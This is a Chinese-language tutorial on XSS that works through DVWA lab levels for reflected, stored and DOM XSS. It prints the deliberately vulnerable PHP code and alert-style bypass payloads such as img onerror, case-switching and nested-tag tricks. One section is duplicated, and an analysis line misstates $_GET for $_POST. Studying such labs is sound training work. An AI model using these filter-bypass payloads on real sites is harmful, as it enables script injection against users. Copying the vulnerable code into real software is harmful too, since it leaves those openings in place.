# WEB漏洞 
如果网站存在WEB漏洞并被黑客攻击者利用，攻击者可以轻易控制整个网站，并可进一步提权获取网站服务器权限，控制整个服务器。主要有以下几种攻击方法：

- 1.SQL注入
- 2.XSS跨站点脚本
- 3.跨目录访问
- 4.缓冲区溢出
- 5.cookies修改
- 6.Http方法篡改
- 7.CSRF
- 8.CRLF
- 9.命令行注入

----------


## Xss

### Xss的形成原理

xss中文名是“跨站脚本攻击”，英文名“Cross Site Scripting”。xss也是一种注入攻击，当web应用对用户输入过滤不严格，攻击者写入恶意的脚本代码（HTML、JavaScript）到网页中时，如果用户访问了含有恶意代码的页面，恶意脚本就会被浏览器解析执行导致用户被攻击。
常见的危害有：cookie窃取，session劫持，钓鱼攻击，蠕虫，ddos等。

### Xss的分类
- 反射型: 反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称为“非持久性xss”。
 
- 存储型: 存储型xss一出现在网站留言板，评论处，个人资料处，等需要用户可以对网站写入数据的地方。比如一个论坛评论处由于对用户输入过滤不严格，导致攻击者在写入一段窃取cookie的恶意JavaScript代码到评论处，这段恶意代码会写入数据库，当其他用户浏览这个写入代码的页面时，网站从数据库中读取恶意代码显示到网页中被浏览器执行，导致用户cookie被窃取，攻击者无需受害者密码即可登录账户。所以也被称作“持久性xss”。持久性xss比反射型xss危害要大的多。

- DOM型: DOM xss是基于dom文档对象模型，前端脚本通过dom动态修改页面，由于不与服务端进行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。
常见的可以操纵dom的对象：URL，localtion,referrer等

----------

### 代码案例分析

#### 反射型Xss

----------


1.Low Reflected XSS Source

- 漏洞代码

    	<?php
    		header ("X-XSS-Protection: 0");
    	
    		// Is there any input?
    		if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    
    		// Feedback for end user
    		echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
    		}
    
    	?> 




- 分析与利用

	直接通过$_GET方式获取name的值，之后未进行任何编码和过滤，导致用户输入一段js脚本会执行。

- 构造payload

	`	
	<script>alert(/xss/)</script>
	`



----------

2.Medium Reflected XSS Source

- 漏洞代码

		<?php
			header ("X-XSS-Protection: 0");

			// Is there any input?
			if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {

			// Get input
			$name = str_replace( '<script>', '', $_GET[ 'name' ] );
			
			// Feedback for end user
			echo "<pre>Hello ${name}</pre>";
			}
		
		?> 


- 分析与利用

	str_replace对输入的 `<script>` 标签进行替换为空

- 构造payload
	
	
	1. 此时可以多写入一个`<script>`, 过滤方法把中间的`<script>`标签替换为空之后 `<scrip` 与 `t>` 重新组合一个`<script>`，成功执行代码
	2. 标签转换大小写的方式进行绕过 `<scRipt>alert(/xss2/)</sCript>`
	3. 构造别的标签 如`<img src=0 onerror=alert(/xss1/)>`
	4. 前端是可以插入一些注释标签的，后台可能不认识`<scri<!--test-->pt`>,并不会认为只是`<script>`标签


----------

3.High Reflected XSS Source

- 漏洞代码
 
		<?php
		
			header ("X-XSS-Protection: 0");
			
			// Is there any input?
	
			if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {

			// Get input
			$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
			
			// Feedback for end user
			echo "<pre>Hello ${name}</pre>";
			}
		?>

- 分析与利用

	preg_replace执行一个正则表达式的搜索和替换，这时候不论是大小写、双层 `<script>` 都无法绕过，此时可以使用别的标签，比如刚刚使用过的 `<img>`

- 构造payload
	
	
	1. 构造别的标签 如 `<img src=0 onerror=alert(/xss/)>`
	2. URL变化为: <http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D0+onerror%3Dalert(%2Fxss%2F)%3E#>


----------

4.Impossible Reflected XSS Source

- 漏洞代码
 
		<?php

			// Is there any input?
			if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {

		    // Check Anti-CSRF token
		    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
		
		    // Get input
		    $name = htmlspecialchars( $_GET[ 'name' ] );
		
		    // Feedback for end user
		    echo "<pre>Hello ${name}</pre>";
			}
		
			// Generate Anti-CSRF token
			generateSessionToken(); 
		?>

- 分析与利用

	`Htmlspecialchars()` 方法将用户输入的特殊字符转换为 HTML 实体，< > “ ‘ &等字符会被转换。

	![avatar](https://img-blog.csdnimg.cn/20190501103620984.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzUzNDU0OQ==,size_16,color_FFFFFF,t_70)

	 `user_token` 和 `session_token`，这是防csrf的，因为经常是xss+csrf结合攻击

- 构造payload
	
	
	1. 此处不存在xss漏洞


----------


### 代码案例分析

#### 存储型Xss

----------


1.Low Stored XSS Source

- 漏洞代码

    	<?php
    		if( isset( $_POST[ 'btnSign' ] ) ) {
		    // Get input
		    $message = trim( $_POST[ 'mtxMessage' ] );
		    $name    = trim( $_POST[ 'txtName' ] );
		
		    // Sanitize message input
		    $message = stripslashes( $message );
		    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		
		    // Sanitize name input
		    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		
		    // Update database
		    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
		    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
		
		    //mysql_close();
		} 
    
    	?> 




- 分析与利用

	直接通过 `$_GET` 方式获取name的值，之后未进行任何编码和过滤，导致用户输入一段js脚本会执行。
	
    `trim(string,charlist)` # 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格
    可选参数charlist支持添加额外需要删除的字符。

	`stripslashes()` # 去掉反斜杠
	
	`isset()`    # 检测变量是否设置，并且不是 NULL。 

	`is_object()`  # 检测变量是否是一个对象  

	`$GLOBALS["___mysqli_ston"]`  # 相当于数据库连接 `link=(GLOBALS[“___mysqli_ston”] = mysqli_connect(hostname,username, $pwd));`

	`mysqli_real_escape_string()`  # 转义特殊字符，比如转义单引号，防止影响$sql语句的闭合

	**最终未对用户输入数据进行xss检测编码，直接写入到数据库中，于是造成存储型xss漏洞。**



- 构造payload

	`	
	<script>alert(/xss/)</script>
	`



----------

2.Medium Stored XSS Source

- 漏洞代码

    	<?php
			if( isset( $_POST[ 'btnSign' ] ) ) {
			    // Get input
			    $message = trim( $_POST[ 'mtxMessage' ] );
			    $name    = trim( $_POST[ 'txtName' ] );
			
			    // Sanitize message input
			    $message = strip_tags( addslashes( $message ) );
			    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			    $message = htmlspecialchars( $message );
			
			    // Sanitize name input
			    $name = str_replace( '<script>', '', $name );
			    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			
			    // Update database
			    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
			    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
			
			    //mysql_close();
			} 
    
    	?> 




- 分析与利用

	直接通过$_GET方式获取name的值，之后未进行任何编码和过滤，导致用户输入一段js脚本会执行。

- 构造payload

	`	
	<script>alert(/xss/)</script>
	`



----------

2.Medium Stored XSS Source

- 漏洞代码

    	<?php
			if( isset( $_POST[ 'btnSign' ] ) ) {
			    // Get input
			    $message = trim( $_POST[ 'mtxMessage' ] );
			    $name    = trim( $_POST[ 'txtName' ] );
			
			    // Sanitize message input
			    $message = strip_tags( addslashes( $message ) );
			    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			    $message = htmlspecialchars( $message );
			
			    // Sanitize name input
			    $name = str_replace( '<script>', '', $name );
			    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			
			    // Update database
			    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
			    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
			
			    //mysql_close();
			} 
    
    	?> 




- 分析与利用

	`$message = htmlspecialchars( $message )`  # `message` 对用户输入数据进行编码转换，因此不存在xss漏洞
		
	`$name = str_replace( '<script>', '', $name );`  # `str_replace`方法把`<script>`替换为空,存在三种方法绕过
	

- 构造payload

	**1.非`<script>`标签**

	`<img src=0 onerror=alert(/xss1/)>`

	**2.大小写转换**
		
    `<Script>alert(/xss2/)</sCript>`

	**3.双重`<script>`标签**

    `<sc<script>ript>alert(/xss3/)</script>`

----------

3.High Stored XSS Source

- 漏洞代码

    	<?php
			if( isset( $_POST[ 'btnSign' ] ) ) {
			    // Get input
			    $message = trim( $_POST[ 'mtxMessage' ] );
			    $name    = trim( $_POST[ 'txtName' ] );
			
			    // Sanitize message input
			    $message = strip_tags( addslashes( $message ) );
			    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			    $message = htmlspecialchars( $message );
			
			    // Sanitize name input
			    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
			    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			
			    // Update database
			    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
			    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
			
			    //mysql_close();
			} 
    
    	?> 




- 分析与利用

		
	`$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );`   # `preg_replace` 执行一个正则表达式的搜索和替换，此时可以使用别的标签`<img> <a> <iframe>` 等，比如刚刚使用过的`<img>`

- 构造payload

	`	
	<img src=0 onerror=alert(/xss/)>
	`



----------

4.Impossible Stored XSS Source

- 漏洞代码

    	<?php
			if( isset( $_POST[ 'btnSign' ] ) ) {
			    // Check Anti-CSRF token
			    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
			
			    // Get input
			    $message = trim( $_POST[ 'mtxMessage' ] );
			    $name    = trim( $_POST[ 'txtName' ] );
			
			    // Sanitize message input
			    $message = stripslashes( $message );
			    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			    $message = htmlspecialchars( $message );
			
			    // Sanitize name input
			    $name = stripslashes( $name );
			    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			    $name = htmlspecialchars( $name );
			
			    // Update database
			    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
			    $data->bindParam( ':message', $message, PDO::PARAM_STR );
			    $data->bindParam( ':name', $name, PDO::PARAM_STR );
			    $data->execute();
			}
			
			// Generate Anti-CSRF token
			generateSessionToken(); 
    
    	?> 




- 分析与利用

	`htmlspecialchars()`存在,此处没有漏洞,如果 `htmlspecialchars()` 使用不当,可以通过编码来绕过

- 构造payload

	`	
	无
	`



----------

### 代码案例分析

#### DOM型Xss

----------


1.Low DOM XSS Source

- 漏洞代码

    	<?php
    	
			 # No protections, anything goes
 
    	?> 




- 分析与利用

	由于未做任何安全校验，直接构造payload

- 构造payload

	<http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(1)%3C/script%3E>



----------

2.Medium DOM XSS Source

- 漏洞代码

    	<?php
			
			// Is there any input?
			if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
				$default = $_GET['default'];
				
				# Do not allow script tags
				if (stripos ($default, "<script") !== false) {
					header ("location: ?default=English");
					exit;
				}
			}
			 
    	?> 

- DOM

		<p>Please choose a language:</p>
			 
		<form name="XSS" method="GET">
			<select name="default">
				<script>
					if (document.location.href.indexOf("default=") >= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
						document.write("<option value='' disabled='disabled'>----</option>");
					}

						document.write("<option value='English'>English</option>");
						document.write("<option value='French'>French</option>");
						document.write("<option value='Spanish'>Spanish</option>");
						document.write("<option value='German'>German</option>");
				</script>
			</select>
			<input type="submit" value="Select" />
		</form>
	

- 分析与利用

	`array_key_exists()`  # 检查数组里是否有指定的键名或索引，并且default值不为null。

	`stripos()` # 返回 default 中字符串`<script>`首次出现的位置,（不区分大小写）如果未发现返回false。且进入header跳转。 此时`<script>` 标签不再可用，可以尝试别的标签 如： `<img>` , 先闭合 `</option></select>` 标签，

- 构造payload

	<http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English%3E%3E/option%3E%3C/select%3E%3Cimg%20src=%27x%27%20onerror=%27alert(1)%27%3E>

	

----------

3.High DOM XSS Source

- 漏洞代码

    	<?php
    	
			// Is there any input?
			if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
			
				# White list the allowable languages
				switch ($_GET['default']) {
					case "French":
					case "English":
					case "German":
					case "Spanish":
						# ok
						break;
					default:
						header ("location: ?default=English");
						exit;
				}
			}
 
    	?> 


- DOM

		<p>Please choose a language:</p>
			 
		<form name="XSS" method="GET">
			<select name="default">
				<script>
					if (document.location.href.indexOf("default=") >= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<option value='" + lang + "'>" + lang + "</option>");
						document.write("<option value='' disabled='disabled'>----</option>");
					}

						document.write("<option value='English'>English</option>");
						document.write("<option value='French'>French</option>");
						document.write("<option value='Spanish'>Spanish</option>");
						document.write("<option value='German'>German</option>");
				</script>
			</select>
			<input type="submit" value="Select" />
		</form>
	


- 分析与利用

	以上逻辑代码只要不符合`case`，进入 `default `语句，在`?default=English` 设置#字符，因为#之后的字符串不会被发送到服务器上

	输入的参数并没有进行URL解码,直接赋值给option标签

- 构造payload

	<http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert(1)%3C/script%3E>

----------

4.Impossible DOM XSS Source

- 漏洞代码

    	<?php
    	
			# Don't need to do anything, protction handled on the client side
 
    	?> 




- 分析与利用

	注释写的是保护的代码在客户端的里面

- 构造payload

	无



----------